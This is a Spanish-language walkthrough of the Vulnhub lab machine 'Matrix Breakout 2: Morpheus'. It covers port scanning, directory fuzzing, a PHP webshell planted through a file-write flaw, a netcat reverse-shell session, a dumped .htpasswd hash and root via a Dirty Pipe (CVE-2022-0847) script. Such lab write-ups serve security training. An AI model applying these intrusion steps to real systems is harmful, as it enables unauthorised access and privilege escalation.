---
title: Matrix Breakout - Vulnhub
categories: [ Linux ]
tags: [ Vulnhub ]
---

<img src="/assets/img/VH/Matrix-Breakout/vulnhub.png">

Buenas!! Hoy completaremos la máquina `Matrix Breakout` de la plataforma de [Vulnhub](https://vulnhub.com/entry/matrix-breakout-2-morpheus,757/), donde tocaremos los siguientes puntos:

- **Arbitrary File Writing**
- **Exploiting CVE-2022-0847 Dirty Pipe**

## Enumeración

* * * 

Para comenzar con la máquina, deberemos de saber su IP, así que comenzaremos con la herramienta `arp-scan` para escanear toda nuestra red local

```shell
❯ arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ed:e8:42, IPv4: 192.168.1.84
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	94:6a:b0:5c:aa:ed (52:6a:b0:5c:aa:ee)	Arcadyan Corporation
192.168.1.91	00:0c:29:bd:77:00	VMware, Inc.
192.168.1.92	a8:93:4a:00:55:55	CHONGQING FUGUI ELECTRONICS CO.,LTD.
192.168.1.72	b2:be:76:79:1a:2c (52:6a:b0:5c:aa:ee)	(Unknown: locally administered)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.051 seconds (124.82 hosts/sec). 4 responded
```

En base al OUI (Organizational Unique Identifier) que son las primeras 3 partes de la dirección MAC, nos damos cuenta que la IP `192.168.1.91` le corresponde a VMware, así que podemos suponer que la máquina víctima tiene esta IP, procederemos con un escaneo de puertos

```shell
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.91 -oG allPorts
Nmap scan report for 192.168.1.91
PORT   STATE SERVICE   REASON
22/tcp open  ssh       syn-ack ttl 64
80/tcp open  http      syn-ack ttl 64
81/tcp open  hosts2-ns syn-ack ttl 64
MAC Address: 00:0C:29:BD:77:00 (VMware)
```

Ahora con la herramienta `extractPorts` extraeremos la información importante de la captura anterior, como la IP y los puertos abiertos

```shell
❯ which extractPorts | batcat -l bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ extractPorts () {
   2   │     ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
   3   │     ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
   4   │     echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
   5   │     echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
   6   │     echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
   7   │     echo $ports | tr -d '\n' | xclip -sel clip
   8   │     echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
   9   │     /bin/batcat --paging=never extractPorts.tmp
  10   │     rm extractPorts.tmp
  11   │ }
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ extractPorts allPorts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 192.168.1.91
   5   │     [*] Open ports: 22,80,81
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora que tenemos todo preparado, iniciaremos otro escaneo con Nmap, este de ahora será mucho más intenso y únicamente lo aplicaremos sobre los puertos abiertos

```shell
❯ nmap -p22,80,81 -sCV 192.168.1.91 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 22:05 CET
Nmap scan report for morpheus.home (192.168.1.91)
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|_  256 aa83c351786170e5b7469f07c4ba31e4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Morpheus:1
81/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
MAC Address: 00:0C:29:BD:77:00 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
```

Si nos metemos a la página web, podemos ver lo siguiente

![](/assets/img/VH/Matrix-Breakout/web1.png)

No encontramos nada interesante, si nos conectamos al servicio HTTP corriendo en el puerto 81, nos pide unas credenciales (las cuales actualmente no poseemos)

![](/assets/img/VH/Matrix-Breakout/login.png)

En este punto lo que haremos será fuzzear por directorios en el puerto 80, en mi caso voy a usar la herramienta `gobuster`, aunque podéis usar otras como `wfuzz`, `ffuf` o `dirbuster`, encontramos el archivo `graffiti.php`

```shell
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.91 -t 200 -x html,php,txt
===============================================================
[+] Url:                     http://192.168.1.91
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
/index.html           (Status: 200) [Size: 348]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.91/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/graffiti.txt         (Status: 200) [Size: 139]
/graffiti.php         (Status: 200) [Size: 451]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
===============================================================
2023/03/03 22:48:51 Finished
===============================================================
```

## Explotación

* * *

Si accedemos al recurso `graffiti.php`, el cual nos pide un mensaje, vamos a interceptar la petición con burpsuite

![](/assets/img/VH/Matrix-Breakout/graffiti.png)

![](/assets/img/VH/Matrix-Breakout/burp.png)

Si nos fijamos bien en la petición, vemos que nos da la opción de un mensaje y un archivo, vamos a intentar colar una webshell en php...

![](/assets/img/VH/Matrix-Breakout/burp1.png)

Ahora si accedemos al recurso en PHP, y le concatenanos `?cmd=(comando)` a la URL, nos damos cuenta que estamos ejecutando comandos, así que nos entablaremos una reverse shell

![](/assets/img/VH/Matrix-Breakout/web2.png)

![](/assets/img/VH/Matrix-Breakout/web3.png)

```shell
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.1.84] from (UNKNOWN) [192.168.1.91] 46216
bash: cannot set terminal process group (617): Inappropriate ioctl for device
bash: no job control in this shell
www-data@morpheus:/var/www/html$ whoami
whoami
www-data
www-data@morpheus:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@morpheus:/var/www/html$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:bd:77:00 brd ff:ff:ff:ff:ff:ff
    altname enp2s1
    inet 192.168.1.91/24 brd 192.168.1.255 scope global dynamic ens33
       valid_lft 82202sec preferred_lft 82202sec
    inet6 fe80::20c:29ff:febd:7700/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:75:05:78:ed brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:75ff:fe05:78ed/64 scope link 
       valid_lft forever preferred_lft forever
5: vethcf0f694@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether b2:b8:44:aa:01:27 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::b0b8:44ff:feaa:127/64 scope link 
       valid_lft forever preferred_lft forever
www-data@morpheus:/var/www/html$ 
```

Si nos vamos a la raiz, encontramos la primera flag!

```shell
www-data@morpheus:/$ cat FLAG.txt 
Flag 1!

You've gotten onto the system.  Now why has Cypher locked everyone out of it?

Can you find a way to get Cypher's password? It seems like he gave it to 
Agent Smith, so Smith could figure out where to meet him.

Also, pull this image from the webserver on port 80 to get a flag.

/.cypher-neo.png
www-data@morpheus:/$ 
```

## Escalada de Privilegios

* * * 

Si bien recordamos, en el puerto 81 estaba corriendo el servicio `nginx`, así que nos dirigiremos al directorio `/var/nginx/html/`, para encontrar la contraseña hasheada del usuario `cypher` en la web

```shell
www-data@morpheus:/$ cd /var/nginx/html/
www-data@morpheus:/var/nginx/html$ ls -la
total 784
drwxr-xr-x 2 nginx nginx   4096 Oct 28  2021 .
drwxr-xr-x 3 nginx nginx   4096 Oct 28  2021 ..
-rw-r--r-- 1 nginx nginx     45 Oct 28  2021 .htpasswd
-rw-r--r-- 1 nginx nginx 782775 Oct 28  2021 ignorance-bliss.png
-rw-r--r-- 1 nginx nginx    522 Oct 28  2021 index.html
www-data@morpheus:/var/nginx/html$ cat .htpasswd 
cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0
www-data@morpheus:/var/nginx/html$ 
```

Si intentamos crackear el hash, este no nos dejará entrar a la web, así que no le veo el sentido a crackearlo ahora mismo

Inspeccionando el sistema con linpeas, nos arroja que el sistema es vulnerable a [CVE-2022-0847](https://gitcode.net/mirrors/r1is/CVE-2022-0847), el cúal es un Dirty Pipe, descargaremos el archivo, le daremos permisos de ejecución y conseguiremos la shell como el usuario `root`!

```shell
www-data@morpheus:/tmp$ chmod +x Dirty-Pipe.sh 
www-data@morpheus:/tmp$ ./Dirty-Pipe.sh 
/etc/passwd已备份到/tmp/passwd
It worked!

# 恢复原来的密码
rm -rf /etc/passwd
mv /tmp/passwd /etc/passwd
root@morpheus:/tmp# 
```

Ahora que somos el usuario `root`, podremos leer las flags (tanto del usuario root y la del usuario cypher)

```shell
root@morpheus:~# cat FLAG.txt 
You've won!

Let's hope Matrix: Resurrections rocks!

root@morpheus:~# cat /home/cypher/FLAG.txt 
You've clearly gained access as user Cypher.

Can you find a way to get to root?
root@morpheus:~# 
```

A día de hoy no sé si habrán otras maneras de escalar privilegios, si se encuentra alguna otra manera, abridme un MD al discord `L4nder#3180`